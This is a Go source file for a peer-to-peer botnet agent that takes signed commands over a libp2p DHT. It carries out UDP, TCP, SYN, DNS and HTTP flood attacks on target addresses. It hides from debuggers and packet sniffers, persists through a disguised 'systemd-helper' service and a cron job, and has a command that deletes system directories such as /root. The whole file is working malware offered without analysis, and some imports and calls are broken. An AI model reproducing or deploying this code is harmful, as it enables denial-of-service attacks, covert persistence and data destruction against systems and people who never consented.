package main

import (
	"bytes"
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p-core/crypto"
	"github.com/libp2p/go-libp2p-core/host"
	"github.com/libp2p/go-libp2p-core/network"
	"github.com/libp2p/go-libp2p-core/peer"
	dht "github.com/libp2p/go-libp2p-kad-dht"
	"github.com/miekg/dns"
)

const (
	replayCacheTTL       = 10 * time.Minute
	replayCacheCleanup   = 1 * time.Hour
	persistenceDir       = "/var/lib/.systemd-helper"
	servicePath          = "/etc/systemd/system/systemd-helper.service"
	peerKeyFile          = "/var/lib/.systemd-helper/peer.key"
	statusUpdateInterval = 5 * time.Minute
	commandFetchInterval = 10 * time.Second
	numWorkers           = 2024
)

var (
	bootstrapPeers = []string{
		"/ip4/104.131.131.82/tcp/4001/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
		"/ip4/104.131.131.82/udp/4001/quic/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
	}
	publicKey       *rsa.PublicKey
	startTime       = time.Now()
	attackCounter   int64
	replayCache     = struct {
		sync.RWMutex
		entries map[string]time.Time
	}{entries: make(map[string]time.Time)}
)

type Command struct {
	Command   string `json:"command"`
	Timestamp int64  `json:"timestamp"`
	Signature []byte `json:"signature"`
	TTL       int    `json:"ttl"`
}

type P2PNode struct {
	Host   host.Host
	DHT    *dht.IpfsDHT
	Ctx    context.Context
	Cancel context.CancelFunc
}

type BotNode struct {
	P2PNode
	LastCommandTime time.Time
}

func NewP2PNode() (*P2PNode, error) {
	ctx, cancel := context.WithCancel(context.Background())
	priv, err := loadOrGenerateKey()
	if err != nil {
		cancel()
		return nil, err
	}

	h, err := libp2p.New(libp2p.Identity(priv), libp2p.NATPortMap())
	if err != nil {
		cancel()
		return nil, err
	}

	kadDHT, err := dht.New(ctx, h)
	if err != nil {
		cancel()
		return nil, err
	}

	if err = kadDHT.Bootstrap(ctx); err != nil {
		cancel()
		return nil, err
	}

	return &P2PNode{Host: h, DHT: kadDHT, Ctx: ctx, Cancel: cancel}, nil
}

func loadOrGenerateKey() (crypto.PrivKey, error) {
	if _, err := os.Stat(peerKeyFile); err == nil {
		keyBytes, err := os.ReadFile(peerKeyFile)
		if err != nil {
			return nil, err
		}
		return crypto.UnmarshalPrivateKey(keyBytes)
	}

	priv, _, err := crypto.GenerateKeyPairWithReader(crypto.RSA, 2048, rand.Reader)
	if err != nil {
		return nil, err
	}

	keyBytes, err := crypto.MarshalPrivateKey(priv)
	if err != nil {
		return nil, err
	}

	if err := os.MkdirAll(persistenceDir, 0700); err != nil {
		return nil, err
	}

	if err := os.WriteFile(peerKeyFile, keyBytes, 0600); err != nil {
		return nil, err
	}

	return priv, nil
}

func (n *P2PNode) ConnectToBootstrapPeers() {
	for _, peerAddr := range bootstrapPeers {
		addr, err := peer.AddrInfoFromString(peerAddr)
		if err != nil {
			continue
		}
		if err := n.Host.Connect(n.Ctx, *addr); err != nil {
			continue
		}
	}
}

func (n *P2PNode) StartCommandListener() {
	n.Host.SetStreamHandler("/botnet/command/1.0.0", func(s network.Stream) {
		defer s.Close()
		var cmd Command
		if err := json.NewDecoder(s).Decode(&cmd); err != nil {
			return
		}
		if !cmd.VerifySignature() || isReplayAttack(cmd) {
			return
		}
		go handleCommand(cmd.Command)
	})
}

func (c *Command) VerifySignature() bool {
	if time.Now().Unix() > c.Timestamp+int64(c.TTL) {
		return false
	}
	hashed := sha256.Sum256([]byte(c.Command + "|" + strconv.FormatInt(c.Timestamp, 10)))
	err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], c.Signature)
	return err == nil
}

func isReplayAttack(cmd Command) bool {
	hash := sha256.Sum256([]byte(cmd.Command + "|" + strconv.FormatInt(cmd.Timestamp, 10)))
	hashStr := hex.EncodeToString(hash[:])

	replayCache.RLock()
	_, exists := replayCache.entries[hashStr]
	replayCache.RUnlock()

	if exists {
		return true
	}

	replayCache.Lock()
	replayCache.entries[hashStr] = time.Now()
	replayCache.Unlock()

	return false
}

func cleanupReplayCache() {
	ticker := time.NewTicker(replayCacheCleanup)
	defer ticker.Stop()
	for range ticker.C {
		replayCache.Lock()
		now := time.Now()
		for hash, timestamp := range replayCache.entries {
			if now.Sub(timestamp) > replayCacheTTL {
				delete(replayCache.entries, hash)
			}
		}
		replayCache.Unlock()
	}
}

func (b *BotNode) Start() error {
	b.ConnectToBootstrapPeers()
	b.StartCommandListener()
	go b.ReportStatus()
	go b.FetchCommands()
	go cleanupReplayCache()
	return nil
}

func (b *BotNode) ReportStatus() {
	ticker := time.NewTicker(statusUpdateInterval)
	defer ticker.Stop()
	for range ticker.C {
		status := map[string]interface{}{
			"peer_id":      b.Host.ID().String(),
			"uptime":       time.Since(startTime).Seconds(),
			"last_command": b.LastCommandTime,
			"attack_count": atomic.LoadInt64(&attackCounter),
		}
		data, _ := json.Marshal(status)
		_ = b.DHT.PutValue(b.Ctx, "bot_stats_"+b.Host.ID().String(), data)
	}
}

func (b *BotNode) FetchCommands() {
	ticker := time.NewTicker(commandFetchInterval)
	defer ticker.Stop()
	for range ticker.C {
		val, err := b.DHT.GetValue(b.Ctx, "latest_attack_command")
		if err != nil {
			continue
		}
		var cmd Command
		if err := json.Unmarshal(val, &cmd); err != nil {
			continue
		}
		if cmd.VerifySignature() && !isReplayAttack(cmd) {
			b.LastCommandTime = time.Now()
			go handleCommand(cmd.Command)
		}
	}
}

func CheckDebuggers() {
	if status, err := os.ReadFile("/proc/self/status"); err == nil {
		if !strings.Contains(string(status), "TracerPid:\t0") {
			os.Exit(0)
		}
	}

	for _, tool := range []string{"gdb", "strace", "ltrace", "tcpdump", "wireshark"} {
		if err := exec.Command("pgrep", "-x", tool).Run(); err == nil {
			os.Exit(0)
		}
	}
}

func SetupPersistence() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	if err := os.MkdirAll(persistenceDir, 0755); err != nil {
		return err
	}

	targetPath := filepath.Join(persistenceDir, ".systemd-process")
	if err := copyFile(exePath, targetPath); err != nil {
		return err
	}

	serviceContent := fmt.Sprintf(`[Unit]
Description=System Helper Service
After=network.target
[Service]
ExecStart=%s
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target`, targetPath)

	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return err
	}

	if err := exec.Command("systemctl", "enable", "--now", "systemd-helper.service").Run(); err != nil {
		return err
	}

	cronJob := fmt.Sprintf("@reboot %s", targetPath)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
	return cmd.Run()
}

func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, input, 0755)
}

func handleCommand(cmd string) {
	fields := strings.Fields(cmd)
	if len(fields) == 0 {
		return
	}

	switch fields[0] {
	case "!udpflood":
		if len(fields) != 4 {
			return
		}
		go performUDPFlood(fields[1], fields[2], fields[3])
	case "!tcpflood":
		if len(fields) != 4 {
			return
		}
		go TCPfloodAttack(fields[1], fields[2], fields[3])
	case "!synflood":
		if len(fields) != 4 {
			return
		}
		go performSYNFlood(fields[1], fields[2], fields[3])
	case "!dns":
		if len(fields) != 4 {
			return
		}
		go performDNSFlood(fields[1], fields[2], fields[3])
	case "!http":
		if len(fields) != 4 {
			return
		}
		go performHTTPFlood(fields[1], fields[2], fields[3])
	case "!kill":
		go killerMaps()
	}
	atomic.AddInt64(&attackCounter, 1)
}

func performUDPFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	payload := make([]byte, 65507)
	rand.Read(payload)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					sourcePort := rand.Intn(65535-1024) + 1024
					conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: port})
					if err != nil {
						continue
					}
					_, err = conn.Write(payload)
					if err == nil {
						atomic.AddInt64(&packetCount, 1)
					}
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

func TCPfloodAttack(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(port),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						continue
					}
					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func performSYNFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(port),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						continue
					}
					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func performDNSFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	domains := []string{"youtube.com", "google.com", "spotify.com", "neflix.com", "bing.com", "facebok.com", "amazom.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					dnsQuery := constructDNSQuery(domain, queryType)
					buffer, err := dnsQuery.Pack()
					if err != nil {
						continue
					}
					sourcePort := rand.Intn(65535-1024) + 1024
					_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: port, Zone: fmt.Sprintf("%d", sourcePort)})
					if err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func performHTTPFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var requestCount int64
	resolvedIP, err := resolveTarget(targetIP)
	if err != nil {
		return
	}
	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, port)
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
	}
	referers := []string{
		"https://www.google.com/",
		"https://www.example.com/",
		"https://www.wikipedia.org/",
	}
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{}
			for {
				select {
				case <-ctx.Done():
					return
				default:
					body := make([]byte, 1024)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					resp, err := client.Do(req)
					if err != nil {
						continue
					}
					resp.Body.Close()
					atomic.AddInt64(&requestCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func resolveTarget(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Accept", "application/dns-json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("status code %d", resp.StatusCode)
	}
	var dnsResp struct {
		Answer []struct {
			Data string `json:"data"`
		} `json:"Answer"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
		return "", err
	}
	if len(dnsResp.Answer) == 0 {
		return "", fmt.Errorf("no records found")
	}
	return dnsResp.Answer[0].Data, nil
}

func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096)
	msg.Extra = append(msg.Extra, edns0)
	return msg
}

func killerMaps() {
	for _, dir := range []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data"} {
		os.RemoveAll(dir)
	}
}

func main() {
	node, err := NewP2PNode()
	if err != nil {
		return
	}
	defer node.Cancel()

	bot := &BotNode{P2PNode: *node}
	if err := bot.Start(); err != nil {
		return
	}

	go CheckDebuggers()
	go SetupPersistence()

	select {}
}
